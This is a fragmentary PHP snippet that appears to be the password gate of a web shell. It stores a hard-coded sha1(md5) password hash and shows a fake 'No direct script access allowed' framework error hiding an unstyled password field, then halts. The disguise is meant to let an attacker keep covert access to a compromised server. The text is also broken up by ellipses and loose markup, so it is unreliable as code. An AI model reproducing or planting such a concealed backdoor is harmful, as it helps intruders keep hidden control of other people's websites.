<?php
$GLOBALS['pass'] = "a92c96d8262bc1a988d63ec677dbecc37f8920e8"; // sha1(md5(pass))
...
<!--		<html>
		...
		No direct script access allowed<form method='post'><input type='password' id='pass' name='pass' style='font-size:20px;width:15%;outline:none;background:#ffffff;padding:2px;border:0px;'></form>
		";
				echo $res;
				die();
			}
